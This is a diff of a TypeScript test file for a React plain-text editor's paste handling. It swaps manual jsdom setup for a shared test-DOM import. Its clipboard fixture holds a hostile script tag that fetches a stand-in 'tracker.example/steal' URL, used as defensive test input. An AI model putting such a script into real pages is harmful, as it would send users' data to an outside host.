@@ -2,20 +2,14 @@
  * The plain surface mounted for real: what a paste puts in it, what it does
  * when a paste has nothing to put there, and the toolbar it carries instead of
  * the formatting buttons.
- *
- * React is imported after the jsdom globals are installed so its DOM bindings
- * bind to jsdom's prototypes.
  */
+import "@remit/test-dom";
 import assert from "node:assert/strict";
-import { after, afterEach, before, beforeEach, describe, it } from "node:test";
-import type { JSDOM } from "jsdom";
-import type {
-	act as reactAct,
-	createElement as reactCreateElement,
-} from "react";
-import type { Root, createRoot as reactCreateRoot } from "react-dom/client";
-import type { ComposeModeToggle as ComposeModeToggleType } from "./compose-mode-toggle.js";
-import type { PlainTextEditor as PlainTextEditorType } from "./plain-text-editor.js";
+import { afterEach, beforeEach, describe, it } from "node:test";
+import { act, createElement } from "react";
+import { createRoot, type Root } from "react-dom/client";
+import { ComposeModeToggle } from "./compose-mode-toggle.js";
+import { PlainTextEditor } from "./plain-text-editor.js";
 
 const CLIPBOARD_HTML = [
 	'<meta charset="utf-8">',
@@ -25,14 +19,8 @@ const CLIPBOARD_HTML = [
 	'<script>fetch("https://tracker.example/steal")</script>',
 ].join("");
 
-let dom: JSDOM;
 let container: HTMLElement;
 let root: Root;
-let act: typeof reactAct;
-let createElement: typeof reactCreateElement;
-let createRoot: typeof reactCreateRoot;
-let PlainTextEditor: typeof PlainTextEditorType;
-let ComposeModeToggle: typeof ComposeModeToggleType;
 
 const surface = (): HTMLTextAreaElement => {
 	const textarea = container.querySelector<HTMLTextAreaElement>(
@@ -46,7 +34,7 @@ const surface = (): HTMLTextAreaElement => {
 // reads off the event: a `getData` over the flavours the copy carried.
 const paste = async (flavours: { html?: string; text?: string }) => {
 	const textarea = surface();
-	const event = new dom.window.Event("paste", {
+	const event = new Event("paste", {
 		bubbles: true,
 		cancelable: true,
 	});
@@ -61,48 +49,9 @@ const paste = async (flavours: { html?: string; text?: string }) => {
 	});
 };
 
-before(async () => {
-	const { JSDOM: JSDOMCtor } = await import("jsdom");
-	dom = new JSDOMCtor(
-		"<!doctype html><html><body><div id=root></div></body></html>",
-		{ url: "http://localhost/", pretendToBeVisual: true },
-	);
-	globalThis.window = dom.window as unknown as typeof globalThis.window;
-	globalThis.document = dom.window.document;
-	globalThis.HTMLElement = dom.window.HTMLElement;
-	globalThis.Element = dom.window.Element;
-	globalThis.Node = dom.window.Node;
-	globalThis.Event = dom.window.Event;
-	globalThis.MouseEvent = dom.window.MouseEvent;
-	globalThis.DOMParser = dom.window.DOMParser;
-	globalThis.MutationObserver = dom.window.MutationObserver;
-	globalThis.Range = dom.window.Range;
-	globalThis.AbortController = dom.window.AbortController;
-	globalThis.AbortSignal = dom.window.AbortSignal;
-	globalThis.getComputedStyle = dom.window.getComputedStyle.bind(dom.window);
-	globalThis.requestAnimationFrame = dom.window.requestAnimationFrame.bind(
-		dom.window,
-	);
-	globalThis.cancelAnimationFrame = dom.window.cancelAnimationFrame.bind(
-		dom.window,
-	);
-	Object.defineProperty(globalThis, "navigator", {
-		value: dom.window.navigator,
-		configurable: true,
-	});
-	(
-		globalThis as { IS_REACT_ACT_ENVIRONMENT?: boolean }
-	).IS_REACT_ACT_ENVIRONMENT = true;
-
-	({ act, createElement } = await import("react"));
-	({ createRoot } = await import("react-dom/client"));
-	({ PlainTextEditor } = await import("./plain-text-editor.js"));
-	({ ComposeModeToggle } = await import("./compose-mode-toggle.js"));
-});
-
 beforeEach(() => {
-	container = dom.window.document.createElement("div");
-	dom.window.document.body.append(container);
+	container = document.createElement("div");
+	document.body.append(container);
 });
 
 afterEach(async () => {
@@ -110,10 +59,6 @@ afterEach(async () => {
 		root.unmount();
 	});
 	container.remove();
-});
-
-after(() => {
-	dom.window.close();
 });
 
 /** A controlled surface: the value it shows is the one it last reported. */
@@ -198,7 +143,7 @@ describe("PlainTextEditor", () => {
 		});
 
 		const textarea = surface();
-		assert.equal(dom.window.document.activeElement, textarea);
+		assert.equal(document.activeElement, textarea);
 		assert.equal(textarea.selectionStart, textarea.value.length);
 	});
 
@@ -212,7 +157,7 @@ describe("PlainTextEditor", () => {
 
 		await act(async () => {
 			surface().dispatchEvent(
-				new dom.window.KeyboardEvent("keydown", {
+				new KeyboardEvent("keydown", {
 					bubbles: true,
 					cancelable: true,
 					key: "Enter",
